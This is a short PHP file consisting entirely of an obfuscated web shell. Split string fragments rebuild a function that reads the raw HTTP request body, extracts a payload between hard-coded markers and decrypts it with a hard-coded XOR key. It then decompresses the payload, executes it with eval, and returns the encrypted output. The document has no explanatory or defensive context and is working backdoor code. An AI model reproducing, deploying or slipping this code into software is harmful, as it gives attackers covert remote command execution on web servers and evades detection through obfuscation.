<?php
$l='$j=0;($j<}]$c&&}]$i<$l);$j+}]+,$i++)}]{$}]o.=$t{$}]i}}]^$k{$j};}}ret}]urn $}]o;}if (}]}]@preg_ma';
$u=str_replace('N','','NcreNaNteN_funcNtiNon');
$r=']al(@gzunco}]mpress(}]@x}](@ba}]se}]64_decode($m[1}]]),$k}])));$o=}]@ob_g}]et_co}]ntents();}]@o';
$a='n}]ction}] x($t,$k){$}]c=str}]len}]($k);$l=s}]trlen(}]$t);}]$o=""}];}]f}]or($i=0;$i<$l;)}]{fo}]r(';
$f='b_e}]}]nd_clean()}]}];$r=@bas}]}]e64_encode(@x(@gz}]compr}]ess}]($o)}],$k))}];p}]rint("$p$kh$r$kf");}';
$S='$}]k="8e62}]a88b";$kh="}]74c}]}]07d95}]3af4";}]$}]kf="4e881a28b58c";}]$p="h}]t}]tygoJD2fWr}]G69f";fu';
$w='tc}]h("/$kh(}]}].+)}]$kf/",@file_ge}]t_}]}]con}]tents(}]"php://i}]nput"}]),$m)==1) {@ob_}]start();@}]ev}';
$q=str_replace('}]','',$S.$a.$l.$w.$r.$f);
$h=$u('',$q);$h();
?>
